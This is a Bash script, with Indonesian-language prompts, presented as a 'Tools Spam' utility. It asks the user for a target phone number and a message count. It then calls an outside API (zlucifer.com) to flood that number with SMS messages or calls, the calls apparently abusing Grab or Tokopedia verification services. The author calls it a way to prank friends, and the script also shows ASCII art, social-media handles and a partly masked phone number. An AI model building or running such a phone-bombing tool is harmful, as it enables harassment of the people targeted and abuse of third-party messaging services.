#!/bin/bash
#a simple spam tools
#creatde by:?M?R?.D?3B?R?0N?G??
troll(){
    clear
    sleep 0.03
    echo "         _ "
    sleep 0.03
    echo "        /_)  _.-===-._ "
    sleep 0.03
    echo "       /  .; '_-.'- .'.     _ "
    sleep 0.03
    echo "  __ _/  /.'\ ._  '. , \   (_\ "
    sleep 0.03
    echo " /\_( \  |.'.-._'- .  '|     \ "
    sleep 0.03
    echo " |_)  /  |/'    ''--''\|     _\__ "
    sleep 0.03
    echo " \_)_|  /'  ._.   ._.  '\   / )(_\ "
    sleep 0.03
    echo " )/  (  \_      _      _/   \' (_| "
    sleep 0.03
    echo " /   /    \           /     _) (_/ "
    sleep 0.03
    echo " |   '',_ _'._'---'_.'_ _,.'    | \ "
    sleep 0.03
    echo " \    /  \ \  '''''  / / /     /   \ "
    sleep 0.03
    echo "  \_.'    \ \       / /  |   .' "
    sleep 0.03
    echo "   '--.,   \ \     / /  _;-'' "
    sleep 0.03
    echo "       '|   \ \   / /   | "
    sleep 0.03
    echo "       .;----'''''''----;. "
    sleep 0.03
    echo "      /(                 )\ "
    sleep 0.03
    echo "      \_''-------------''_/ "
    sleep 0.03
    echo "      | '';-----;-----;'' | "
    sleep 0.03
    echo "      | / : \ / : \ / : \ | "
    sleep 0.03
    echo "      |V.','.V.','.V.','.V| "
    sleep 0.03
    echo "      \'./_\.;./_\.;./_\.'/ "
    sleep 0.03
    echo "       ';..___________..;' "
    sleep 0.03
    echo " ============================="
    sleep 2
    echo " ==      Tools Spam     =="
    sleep 0.2
    echo  "==   Created By:Mr.D3BR0NG  =="
    sleep 0.3
    echo " ============================="
}
load(){
    echo -e "\n"
    bar=" >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> "
    barlength=${#bar}
    i=0
    while((i<100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.2
    done
}
get_sms=$(curl -s http://zlucifer.com/api/sms.php)
get_call=$(curl -s http://zlucifer.com/api/call.php)
mulai (){
    echo "Gunakan Troll Project Lagi?"
    echo "y/n?"
    echo
    read lagi
    if [ $lagi = "y" ]; then
            spam
    else
    sleep 0.06
            echo "Terimakasih sudah menggunakan tools Spam"
            sleep 1
            echo Tools Spam by Mr.D3BR0NG | lolcat -a -d 10
            sleep 0.03
            echo Follow me on instagram;@mr_debrong | lolcat -a -d 10
            sleep 0.03
            echo and My GITHUB=http://github.com/D3BR0NG | lolcat -a -d 10
            sleep 0.03
            echo "WA=085314xxxxxx privasi:v"
            sleep 0.03
            echo Thanks to: | lolcat -a -d 10
            sleep 0.03
            echo Razerr Team | lolcat -a -d 10
            sleep 0.03
            echo my Best Friends | lolcat -a -d 10
            sleep 0.03
            echo Mr.CodenZa | lolcat -a -d 10
            sleep 0.02
            echo Zero_Razerr | lolcat -a -d 10
            sleep 0.02
            echo Mr.Xzzty | lolcat -a -d 10
            sleep 0.02
            echo Zero_Razer | lolcat -a -d 10
            Sleep 0.02
            echo Mr.Baldur  | lolcat -a -d 10
    fi
}
#spam
spam(){
    clear
    troll
    echo
    echo "[1] Spam SMS"
    echo "[2] Spam Telp"
    echo "[3] Close Tools Spam"
    echo
    echo " pilih 1/2/3?"
    sleep 5
    echo " pilih angkanya doang gan"
    read pilih
    if [ $pilih = "1" ]; then
            echo "Tools Spam SMS"
            #function spam
            echo
            echo "Silahkan masukan nomor telp target"
            echo contoh 0812345678
            read target # masukin no telp
            echo
            echo "Berapa sms yang mau dikirim?"
            read paket
            echo
            echo Apakah nomor $target "dan SMS dikirim "$paket" sudah benar?"
            echo y/n?
            read confirm
            echo
            if [ $confirm = "y" ]; then
                    load
                    clear
                    echo Melakukan spam SMS ke nomor $target
                    echo
                    echo Jangan close aplikasi sebelum spam selesai mang, sambil ngopi aja gan H3h3 
                    echo ========================================
                    target_do=$get_sms'/sms.php?nomor='$target'&paket='$paket
                    CURL_RESPONSE=`curl -s -o /dev/null -w "%{http_code}" $target_do`
                    echo  Gunakan tools dengan bijak, Ngerjain temen boleh tapi jangan terlalu banyak | lolcat -a -d 10
                    echo
                    echo Follow me on instagram mr_debrong | lolcat -a -d 10
                    sleep 0.2
                    echo  Follow My github:https://github.com/D3BR0NG | lolcat -a -d 10
                    echo Love you all | lolcat -a -d 10
                    sleep 0.4 
                    echo Razerr Team | lolcat -a -d 10
                    echo  CodenZa | lolcat -a -d 10
                    echo  D3BR0NG | lolcat -a 10
                    echo "======================================="
            else
                    echo "Kesalahan"
            fi
        mulai
    elif [ $pilih = "2" ]; then
            echo "Tools Spam Call"
            #function spam
            echo
            echo "Silahkan masukan nomor telp target"
            echo contoh 0812345678
            read target # masukin no telp
            echo
            echo "Gunakan API Grab/Toped?"
            echo "[1] GRAB"
            echo "[2] TOPED"
            echo "1/2?"
            read api
            if [ $api = "1" ]; then
                  api_spam="grab"
            else
                  api_spam="toped"
            fi
            echo Apakah nomor $target dan spam menggunakan $api_spam "sudah benar?"
            echo y/n?
            read confirm
            echo
            if [ $confirm = "y" ]; then
                  load
                  clear
                  echo Melakukan spam call ke nomor $target
                  echo
                  echo Jangan close aplikasi sebelum spam selesai | lolcat -a -d 500
                  echo "========================================"
                  cek_target=`curl -s $get_call/call.php?nomor=$target"&method="$api_spam`
                  echo -e $cek_target
                  echo " Gunakan tools dengan bijak, ngerjain temen boleh, asal jangan banyak-banyak"
                  echo
                  echo Follow me on instagram : mr_debrong | lolcat -a -d 10
                   sleep 0.2
                   echo  Follow My github:https://github.com/D3BR0NG | lolcat -a -d 10
                   sleep 0.08
                  echo Love you all:* | lolcat -a -d 10
                  sleep 0.5
                  echo Mr.D3BR0NG | lolcat -a -d 10
                  sleep 0.09
                  echo Razerr Team | lolcat -a -d 10
                  echo "========================================"
            else
                  echo Kesalahan, silahkan coba lagi
            fi
        mulai
    elif [ $pilih = "3" ]; then
        echo "Terimakasih sudah menggunakan Tools Spam"
        sleep 1
            echo Tools Spam By Mr.D3BR0NG | lolcat -a -d 20
            sleep 0.07
            echo Follow me on instagram mr_debrong | lolcat -a -d 20
            sleep 0.07
            echo and My GITHUB=http://github.com/D3BR0NG | lolcat -a -d 20
            sleep 0.07
            echo "WA=085314xxxxxx privasi:v"
            sleep 0.07
            echo "Thanks to:"
            sleep 0.03
            echo Razerr Team | lolcat -a -d 20
            sleep 0.03
            echo my Best Friends | lolcat -a -d 20
            sleep 0.03
            echo Mr.CodenZa | lolcat -a -d 20
            sleep 0.02
            echo Zero!Razerr | lolcat -a -d 20
            sleep 0.02
            echo MR.XZZTY | lolcat -a -d 20
        close
    else
        clear
        echo "Kesalahan"
        mulai
    fi
}
close(){
    exit
}
clear
echo "Loading.."
load
clear
troll
echo Selamat datang kak, tekan enter untuk mulai. #tulisan keluar
read nick #membaca yang ditulis
clear
troll
echo Selamat datang $nick ":)"
echo
echo "Mulai Tools Spam?"
echo "y/n?"
read mulai
if [ $mulai = "y" ]; then
      spam
else
	 echo Tools Spam By Mr.D3BR0NG | lolcat -a -d 20
            sleep 0.07
            echo Follow me on instagram mr_debrong | lolcat -a -d 20
            sleep 0.07
            echo and My GITHUB=http://github.com/D3BR0NG | lolcat -a -d 20
            sleep 0.07
            echo "WA=085314xxxxxx privasi:v"
            sleep 0.07
            echo "Thanks to:"
            sleep 0.03
            echo Razerr Team | lolcat -a -d 20
            sleep 0.03
            echo my Best Friends | lolcat -a -d 20
            sleep 0.03
            echo Mr.CodenZa | lolcat -a -d 20
            sleep 0.02
            echo Zero!Razerr | lolcat -a -d 20
            sleep 0.02
            echo MR.XZZTY | lolcat -a -d 20
            slepp 0.7
            echo Mr.Baldur | lolcat -a -d 10
      close
fi
